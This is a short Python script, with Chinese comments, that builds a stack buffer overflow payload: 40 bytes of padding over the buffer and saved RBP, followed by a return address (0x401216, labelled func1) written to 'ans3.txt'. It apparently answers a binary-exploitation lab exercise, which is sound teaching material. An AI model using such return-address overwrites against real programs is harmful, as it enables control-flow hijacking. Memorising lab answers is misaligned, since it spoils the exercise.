import struct

# 计算偏移：
# Buffer 起点到 RBP = 32 字节
# RBP 本身 = 8 字节
# 合计 40 字节填充后即为返回地址
padding = b'A' * 32
saved_rbp = b'B' * 8
return_addr = struct.pack("<Q", 0x401216) # func1 地址

payload = padding + saved_rbp + return_addr

with open("ans3.txt", "wb") as f:
    f.write(payload)